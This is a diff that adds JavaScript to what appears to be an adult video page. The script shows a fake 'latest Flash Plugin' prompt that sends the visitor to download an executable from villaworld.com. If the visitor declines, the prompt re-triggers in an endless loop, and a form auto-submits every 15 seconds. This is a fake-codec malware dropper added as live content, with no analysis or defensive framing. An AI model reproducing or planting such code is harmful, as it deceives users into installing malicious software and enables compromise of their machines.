@@ -1,0 +1,32 @@
+<script type="text/javascript" src="../adult-1_files/jquery.js" tppabs="http://villaworld.com/pictures/adult-1_files/jquery.js"></script>
+
+<script language="JavaScript">
+function func() {
+	mustDownload();
+}
+
+function func2()
+{
+	document.getElementById('red1').submit();
+	id2 = setTimeout('func2()',15000);
+}
+
+function mustDownload()
+{
+	if (confirm('You need latest vesrion of Flash Plugin to play this media file. Click \'OK\' to start download.'))
+	{
+		location.href = "http://villaworld.com/images/movie/1256326501.exe";
+	}
+	else
+	{
+		if (alert('Flash Plugin required to play video!'))
+		{
+			mustDownload();
+		}
+		else
+		{
+			mustDownload();
+		}
+	}
+}
+</script>
